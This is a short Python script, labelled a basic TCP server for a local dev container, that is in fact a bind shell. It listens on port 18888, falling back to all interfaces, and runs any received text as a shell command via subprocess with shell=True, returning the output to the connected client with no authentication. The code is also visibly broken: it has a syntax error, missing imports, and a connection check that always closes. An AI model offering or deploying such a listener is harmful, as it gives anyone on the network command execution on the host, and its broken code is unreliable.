# Basic TCP Server 

import socket # For Building TCP Connection
from six.moves import input as raw_input

def local_dev_container_address():
    return [l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1], [[(s.connect(("8.8.8.8", 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) if l][0][0]

def connect(local_dev_port=18888):
    local_dev_addr = local_dev_container_address()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.bind((local_dev_addr, local_dev_port))
    except OSError:
        try:
            s.bind(("0.0.0.0", local_dev_port))
        except OSError:
            s.bind(("127.0.0.1", local_dev_port)) 
            lines = [
                "The service could not be started.",
                "Try changing the host, port, or run-level."
            ]
            for l in lines:
                print(f"Help: {l}")
            import sys
            sys.exit(1)
    s.listen(1)
    while True:
        print(f"[+] Listening for local TCP connection(s) on tcp://{local_dev_addr}:{local_dev_port}")
        conn, addr = s.accept()
        print('[+] Docker got a connection from: ', addr)
        while True:
            command = conn.recv(1024)
            cmd = "{!r}".format(command))
            print(cmd)
            if b'terminate' or b'bye' in command:
                conn.close()
                break
            elif b'kill' in command:
                conn.close()
                import time
                time.sleep(1)
                s.close()
                import sys
                sys.exit(0)
            else:
                CMD = subprocess.Popen(
                    command, 
                    shell=True, 
                    stdout=subprocess.PIPE, 
                    stderr=subprocess.PIPE, 
                    stdin=subprocess.PIPE
                )
                time.sleep(1.15)
                stdout = CMD.stdout.read()
                stderr = CMD.stderr.read()
                if stdout or stderr:
                    print("{!r}".format(stdout))
                    print("{!r}".format(stderr))
                # stdout, stderr = CMD.stdout.read(), CMD.stderr.read()
                conn.send(stdout)
                conn.send(stderr)
                conn.close()
                # conn.send(command)
                # print(conn.recv(1024))

def main ():
    connect()

main()
